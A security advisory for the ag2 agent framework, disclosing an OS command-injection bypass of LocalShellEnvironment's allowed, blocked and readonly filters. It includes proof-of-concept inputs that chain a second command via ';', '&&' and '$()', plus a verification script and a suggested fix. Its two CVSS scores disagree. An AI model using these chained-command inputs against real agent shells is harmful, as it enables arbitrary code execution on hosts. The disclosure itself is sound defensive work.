# GHSA-42mf-vpmr-gw5r

*Canonical version: <https://sfwani.github.io/advisories/ghsa-42mf-vpmr-gw5r/>*

**Command Filter Bypass in LocalShellEnvironment via shell=True Allows Arbitrary OS Command Execution**

| | |
|:--|:--|
| Advisory | [GHSA-42mf-vpmr-gw5r](https://github.com/ag2ai/ag2/security/advisories/GHSA-42mf-vpmr-gw5r) |
| CVE | not assigned |
| Severity | Critical (9.8) |
| CVSS vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')) |
| Published | 2026-10-03 |

### Affected versions

| Package | Ecosystem | Vulnerable | Fixed in |
|:--|:--|:--|:--|
| `ag2` | pip | >= 1.0.0, < 1.1.2 | n/a |

## Details

## Summary

`LocalShellEnvironment.run()` executes commands using `subprocess.run(command, shell=True)` while applying only prefix-based command filtering. The `allowed`, `blocked`, and `readonly` security controls are all trivially bypassable via shell metacharacters (`;`, `&&`, `||`, `|`, backticks, `$()`), allowing arbitrary command execution on the host OS even when the developer has configured restrictions.

## Affected Files

- `autogen/beta/tools/shell/environment/local.py:136-138`: `subprocess.run(command, shell=True)`
- `autogen/beta/tools/shell/environment/base.py:48-58`: `matches()` prefix-only check
- `autogen/beta/tools/shell/environment/base.py:15-45`: `READONLY_COMMANDS` list

## Steps to Reproduce

### Bypass readonly=True

```python
from autogen.beta.tools.shell.environment.local import LocalShellEnvironment

env = LocalShellEnvironment(path="/tmp/test", readonly=True)
# "echo" passes the READONLY_COMMANDS prefix check
# but the semicolon chains an arbitrary second command
result = env.run("echo x; id")
print(result)
# Output: x\nuid=1000(user) gid=1000(user) groups=...
```

### Bypass allowed=["git"]

```python
env = LocalShellEnvironment(path="/tmp/test", allowed=["git"])
result = env.run("git --version && id")
print(result)
# Output: git version 2.43.0\nuid=1000(user) gid=1000(user) groups=...
```

### Bypass blocked=["rm", "curl"]

```python
env = LocalShellEnvironment(path="/tmp/test", blocked=["rm", "curl"])
result = env.run("echo $(id)")
print(result)
# Output: uid=1000(user) gid=1000(user) groups=...
# The "echo" prefix is not blocked, but $(id) executes in a subshell
```

### Standalone Verification Script

```python
import subprocess, tempfile

READONLY_COMMANDS = ("cat","head","tail","ls","echo","grep","find","wc","pwd")

def matches(pattern, command):
    stripped = command.strip()
    if not stripped.startswith(pattern):
        return False
    rest = stripped[len(pattern):]
    return rest == "" or rest[0] == " "

tests = [
    ("echo x; id", "readonly bypass via semicolon"),
    ("cat /dev/null | id", "readonly bypass via pipe"),
    ("ls && id", "readonly bypass via AND chain"),
    ("echo $(id)", "blocked bypass via subshell"),
]

for cmd, desc in tests:
    passes = any(matches(p, cmd) for p in READONLY_COMMANDS)
    with tempfile.TemporaryDirectory() as td:
        r = subprocess.run(cmd, shell=True, cwd=td, capture_output=True, text=True, timeout=5)
    print(f"[{desc}] filter passes: {passes}, 'id' executed: {'uid=' in r.stdout}")
```

## Root Cause

`local.py:136`:
```python
result = subprocess.run(
    command,
    shell=True,  # Passes entire string to /bin/sh -c
    cwd=self._workdir,
    ...
)
```

The `matches()` function at `base.py:48-58` only checks if the command string starts with an allowed prefix. Since `shell=True` passes the entire string to `/bin/sh`, metacharacters like `;`, `&&`, `||`, and `|` allow chaining arbitrary commands after the prefix.

The code comments at `base.py:14-15` acknowledge this: "commands like `echo` can still redirect output (`echo x > file`), because `shell=True` processing happens inside the OS shell after our prefix check." However, the true impact is arbitrary command execution, not just redirects.

## Impact

Any developer relying on `readonly=True`, `allowed=[...]`, or `blocked=[...]` for security has a false sense of protection. An LLM agent (or prompt injection attack) can execute arbitrary OS commands, establish reverse shells, exfiltrate data, or modify files, even when restrictions are configured.

When exposed via the A2A server (which has no authentication by default), this allows unauthenticated remote code execution on the host OS.

## Suggested Fix

Replace `shell=True` with `shell=False` and use `shlex.split()`:

```python
import shlex
result = subprocess.run(
    shlex.split(command),  # Prevents shell metacharacter interpretation
    shell=False,
    cwd=self._workdir,
    ...
)
```

Note: This removes pipe/redirect support. If those are needed, implement proper shell-aware command parsing that validates each sub-command in a pipeline independently.

## CVSS

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.9 Critical)
